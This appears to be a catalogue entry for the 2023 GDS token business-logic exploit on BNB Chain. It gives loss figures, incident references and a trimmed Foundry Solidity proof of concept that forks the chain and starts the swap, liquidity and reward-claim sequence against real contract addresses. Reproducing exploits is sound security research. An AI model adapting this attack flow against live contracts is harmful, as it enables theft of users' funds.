# [?] - GDS - Business Logic Flaw

## Summary
Severity: Unknown
Chain: BNB Chain
Component: GDS
Published: 2023-01-03
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-01/GDS_exp.sol
Type: defi-exploit-poc

## Details
Lost: $180k
References:
- https://twitter.com/peckshield/status/1610095490368180224
- https://twitter.com/BlockSecTeam/status/1610167174978760704
- https://bscscan.com/tx/0xf9b6cc083f6e0e41ce5e5dd65b294abf577ef47c7056d86315e5e53aa662251e
- https://bscscan.com/tx/0x2bb704e0d158594f7373ec6e53dc9da6c6639f269207da8dab883fc3b5bf6694

```solidity
contract ContractTest is Test {
    GDSToken GDS = GDSToken(0xC1Bb12560468fb255A8e8431BDF883CC4cB3d278);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    ISwapFlashLoan swapFlashLoan = ISwapFlashLoan(0x28ec0B36F0819ecB5005cAB836F4ED5a2eCa4D13);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x4526C263571eb57110D161b41df8FD073Df3C44A);
    address[] contractList;
    uint256 PerContractGDSAmount;
    uint256 SwapFlashLoanAmount;
    uint256 dodoFlashLoanAmount;
    address deadAddress = 0x000000000000000000000000000000000000dEaD;
    address dodo = 0x26d0c625e5F5D6de034495fbDe1F6e9377185618;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 24_449_918);
        cheats.label(address(GDS), "GDS");
        cheats.label(address(USDT), "USDT");
    }

    function testExploit() public {
        address(WBNB).call{value: 50 ether}("");
        WBNBToUSDT();
        USDTToGDS(10 * 1e18);
        GDSUSDTAddLiquidity(10 * 1e18, GDS.balanceOf(address(this)));
        USDTToGDS(USDT.balanceOf(address(this)));
        PerContractGDSAmount = GDS.balanceOf(address(this)) / 100;
        ClaimRewardFactory();
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-01/GDS_exp.sol_
